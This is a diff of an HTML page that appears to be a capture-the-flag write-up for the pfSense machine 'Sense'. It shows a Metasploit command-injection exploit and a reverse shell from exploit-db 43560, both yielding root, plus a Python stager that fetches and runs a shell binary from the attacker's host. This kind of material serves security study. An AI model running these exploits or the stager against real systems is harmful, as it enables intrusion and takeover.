-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:4444 -&gt; 172.17.0.1:39110<span style="color:#ff79c6">)</span> at 2020-09-20 13:14:27 +0000
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Deleted gdZ
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>meterpreter &gt;
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 &gt; use exploit/unix/http/pfsense_graph_injection_exec
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; info
+msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> rhosts 10.10.10.60
+<span style="color:#8be9fd;font-style:italic">rhosts</span> <span style="color:#ff79c6">=</span>&gt; 10.10.10.60
+msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> username rohit
+<span style="color:#8be9fd;font-style:italic">username</span> <span style="color:#ff79c6">=</span>&gt; rohit
+msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> lhost 10.10.14.38
+<span style="color:#8be9fd;font-style:italic">lhost</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.38
+msf6 exploit<span style="color:#ff79c6">(</span>unix/http/pfsense_graph_injection_exec<span style="color:#ff79c6">)</span> &gt; run
+
+<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.38:4444:-  -
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 0.0.0.0:4444
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Detected pfSense 2.1.3-RELEASE, uploading intial payload
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Payload uploaded successfully, executing
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">39264</span> bytes<span style="color:#ff79c6">)</span> to 172.17.0.1
+<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:4444 -&gt; 172.17.0.1:39110<span style="color:#ff79c6">)</span> at 2020-09-20 13:14:27 +0000
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Deleted gdZ
+
+meterpreter &gt;
+</code></pre></td></tr></table>
 </div>
 </div><p>We collect flags</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; getuid
-</span></span><span style="display:flex;"><span>Server username: root <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
-</span></span><span style="display:flex;"><span>meterpreter &gt; cat /home/rohit/user.txt
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
-</span></span><span style="display:flex;"><span>meterpreter &gt; cat /root/root.txt
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid
+Server username: root <span style="color:#ff79c6">(</span>0<span style="color:#ff79c6">)</span>
+meterpreter &gt; cat /home/rohit/user.txt
+<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
+meterpreter &gt; cat /root/root.txt
+<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
+</code></pre></td></tr></table>
 </div>
 </div><h1 id="without-metasploit">Without metasploit</h1>
 <h2 id="exploitdb-43560">exploitdb 43560</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  sense searchsploit -p <span style="color:#bd93f9">43560</span>
-</span></span><span style="display:flex;"><span>  Exploit: pfSense &lt; 2.1.4 - <span style="color:#f1fa8c">&#39;status_rrd_graph_img.php&#39;</span> Command Injection
-</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/43560
-</span></span><span style="display:flex;"><span>     Path: /opt/exploitdb/exploits/php/webapps/43560.py
-</span></span><span style="display:flex;"><span>File Type: Python script, ASCII text executable, with CRLF line terminators
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Copied EDB-ID <span style="color:#6272a4">#43560&#39;s path to the clipboard</span>
-</span></span><span style="display:flex;"><span>_  sense python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.38 --lport <span style="color:#bd93f9">9000</span> --username rohit --password pfsense
-</span></span><span style="display:flex;"><span>CSRF token obtained
-</span></span><span style="display:flex;"><span>Running exploit...
-</span></span><span style="display:flex;"><span>Exploit completed
-</span></span><span style="display:flex;"><span>_  sense
-</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-</span></span><span style="display:flex;"><span>_  sense nc -lnvp <span style="color:#bd93f9">9000</span>
-</span></span><span style="display:flex;"><span>Listening on 0.0.0.0 <span style="color:#bd93f9">9000</span>
-</span></span><span style="display:flex;"><span>Connection received on 172.19.0.1 <span style="color:#bd93f9">45020</span>
-</span></span><span style="display:flex;"><span>sh: can&#39;t access tty; job control turned off
-</span></span><span style="display:flex;"><span><span style="color:#6272a4"># id</span>
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>wheel<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>wheel<span style="color:#ff79c6">)</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sense searchsploit -p <span style="color:#bd93f9">43560</span>
+  Exploit: pfSense &lt; 2.1.4 - <span style="color:#f1fa8c">&#39;status_rrd_graph_img.php&#39;</span> Command Injection
+      URL: https://www.exploit-db.com/exploits/43560
+     Path: /opt/exploitdb/exploits/php/webapps/43560.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied EDB-ID <span style="color:#6272a4">#43560&#39;s path to the clipboard</span>
+_  sense python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.38 --lport <span style="color:#bd93f9">9000</span> --username rohit --password pfsense
+CSRF token obtained
+Running exploit...
+Exploit completed
+_  sense
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+_  sense nc -lnvp <span style="color:#bd93f9">9000</span>
+Listening on 0.0.0.0 <span style="color:#bd93f9">9000</span>
+Connection received on 172.19.0.1 <span style="color:#bd93f9">45020</span>
+sh: can&#39;t access tty; job control turned off
+<span style="color:#6272a4"># id</span>
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>wheel<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>wheel<span style="color:#ff79c6">)</span>
+</code></pre></td></tr></table>
 </div>
 </div><h2 id="exploitdb-39709">exploitdb 39709</h2>
 <p>another exploit but needs rework</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>stager <span style="color:#ff79c6">=</span> (
-</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;echo </span><span style="color:#f1fa8c">\&#39;</span><span style="color:#f1fa8c">&lt;?php $shell =file_get_contents(&#34;http://10.10.14.38/shell.elf&#34;);&#39;</span> <span style="color:#ff79c6">+</span>
-</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;file_put_contents(&#34;myshell.elf&#34;, $shell);&#39;</span> <span style="color:#ff79c6">+</span>
-</span></span><span style="display:flex;"><span><span style="color:#f1fa8c">&#39;system(&#34;chmod 755 myshell.elf &amp;&amp; ./myshell.elf&#34;); ?&gt; </span><span style="color:#f1fa8c">\&#39;</span><span style="color:#f1fa8c"> &gt; shellexec&#39;</span>
-</span></span><span style="display:flex;"><span>)
-</span></span><span style="display:flex;"><span>encoded_stager <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> c <span style="color:#ff79c6">in</span> stager:
-</span></span><span style="display:flex;"><span>  encoded_stager <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\\\</span><span style="color:#f1fa8c">%03d</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span>(<span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#8be9fd;font-style:italic">oct</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(c))))
-</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span> (encoded_stager)
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">stager <span style="color:#ff79c6">=</span> (
+<span style="color:#f1fa8c">&#39;echo </span><span style="color:#f1fa8c">\&#39;</span><span style="color:#f1fa8c">&lt;?php $shell =file_get_contents(&#34;http://10.10.14.38/shell.elf&#34;);&#39;</span> <span style="color:#ff79c6">+</span>
+<span style="color:#f1fa8c">&#39;file_put_contents(&#34;myshell.elf&#34;, $shell);&#39;</span> <span style="color:#ff79c6">+</span>
+<span style="color:#f1fa8c">&#39;system(&#34;chmod 755 myshell.elf &amp;&amp; ./myshell.elf&#34;); ?&gt; </span><span style="color:#f1fa8c">\&#39;</span><span style="color:#f1fa8c"> &gt; shellexec&#39;</span>
+)
+encoded_stager <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
+<span style="color:#ff79c6">for</span> c <span style="color:#ff79c6">in</span> stager:
+  encoded_stager <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\\\\</span><span style="color:#f1fa8c">%03d</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span>(<span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#8be9fd;font-style:italic">oct</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(c))))
+<span style="color:#8be9fd;font-style:italic">print</span> (encoded_stager)
+</code></pre></td></tr></table>
 </div>
 </div>
       </div>
